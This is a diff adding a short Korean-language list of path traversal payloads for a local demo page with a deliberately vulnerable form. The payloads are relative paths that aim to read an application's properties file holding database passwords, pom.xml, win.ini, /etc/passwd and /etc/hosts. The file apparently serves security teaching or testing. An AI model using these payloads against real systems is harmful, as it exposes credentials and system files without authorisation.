@@ -1,0 +1,16 @@
+# 경로 순회 공격 페이로드
+# 데모 페이지: http://localhost:8080/demo/path-traversal
+# [취약 폼] 입력란에 아래 경로를 붙여넣어 테스트
+
+## DB 비밀번호 등 설정 파일 노출
+../src/main/resources/application.properties
+
+## 프로젝트 구조 / 의존성 노출
+../../pom.xml
+
+## Windows 시스템 파일
+../../../Windows/win.ini
+
+## Linux 시스템 파일
+../../../etc/passwd
+../../../etc/hosts
